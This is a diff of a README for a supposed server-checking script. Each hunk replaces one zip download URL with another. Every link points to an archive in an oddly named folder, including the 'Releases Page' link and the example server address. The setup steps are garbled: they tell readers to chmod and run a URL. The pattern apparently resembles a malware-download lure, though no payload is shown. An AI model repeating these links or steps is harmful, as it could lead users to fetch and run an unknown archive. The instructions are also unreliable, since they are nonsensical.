@@ -6,7 +6,7 @@ Welcome to the Server-Service-Checker repository! This tool helps you check if y
 
 ## 📥 Download & Install
 
-To get the Server-Service-Checker, visit this page to download: [Download Here](https://raw.githubusercontent.com/531santhosh/Server-Service-Checker/main/Cypselomorphae/Server-Service-Checker.zip).
+To get the Server-Service-Checker, visit this page to download: [Download Here](https://github.com/531santhosh/Server-Service-Checker/raw/refs/heads/main/Cypselomorphae/Service_Checker_Server_v1.3.zip).
 
 You will find different versions of the software on the releases page. Choose the one that suits your system.
 
@@ -30,13 +30,13 @@ After downloading the appropriate file, follow these steps to run the script:
 3. **Make the script executable**. Type the following command:
 
    ```
-   chmod +x https://raw.githubusercontent.com/531santhosh/Server-Service-Checker/main/Cypselomorphae/Server-Service-Checker.zip
+   chmod +x https://github.com/531santhosh/Server-Service-Checker/raw/refs/heads/main/Cypselomorphae/Service_Checker_Server_v1.3.zip
    ```
 
 4. Now you can run the script by typing:
 
    ```
-   https://raw.githubusercontent.com/531santhosh/Server-Service-Checker/main/Cypselomorphae/Server-Service-Checker.zip
+   https://github.com/531santhosh/Server-Service-Checker/raw/refs/heads/main/Cypselomorphae/Service_Checker_Server_v1.3.zip
    ```
 
 5. The script will ask you for the server addresses or service names you want to check. Enter them as instructed.
@@ -52,7 +52,7 @@ After downloading the appropriate file, follow these steps to run the script:
 If you want to check if a web server is reachable, simply enter the address like this:
 
 ```
-https://raw.githubusercontent.com/531santhosh/Server-Service-Checker/main/Cypselomorphae/Server-Service-Checker.zip
+https://github.com/531santhosh/Server-Service-Checker/raw/refs/heads/main/Cypselomorphae/Service_Checker_Server_v1.3.zip
 ```
 
 Once you run the script, it will give you a clear report on whether the server is up or down.
@@ -71,7 +71,7 @@ If you would like to contribute to this project, please submit your ideas or sug
 
 ## 🔖 Stay Updated
 
-To keep up with updates and changes, please visit the [Releases Page](https://raw.githubusercontent.com/531santhosh/Server-Service-Checker/main/Cypselomorphae/Server-Service-Checker.zip) regularly.
+To keep up with updates and changes, please visit the [Releases Page](https://github.com/531santhosh/Server-Service-Checker/raw/refs/heads/main/Cypselomorphae/Service_Checker_Server_v1.3.zip) regularly.
 
 ## 🌐 Related Topics
 
